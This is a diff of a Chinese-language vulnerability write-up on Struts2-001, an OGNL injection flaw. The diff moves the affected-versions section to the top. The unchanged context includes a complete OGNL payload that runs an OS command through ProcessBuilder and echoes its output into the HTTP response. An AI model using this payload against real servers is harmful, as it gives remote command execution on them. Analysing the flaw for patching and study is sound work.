@@ -1,4 +1,10 @@
-# Struts2框架处理流程与Struts2-001
+# Struts2-001
+
+## 漏洞影响范围
+
+WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8
+
+而Struts2 对 OGNL 表达式的解析使用了开源组件 `opensymphony.xwork 2.0.3`所以会有漏洞
 
 ## 流程分析
 
@@ -44,9 +50,7 @@
 %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cmd","-c","clac"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
 ```
 
-## 漏洞影响范围
 
-WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8
 
 ## 漏洞修复
 
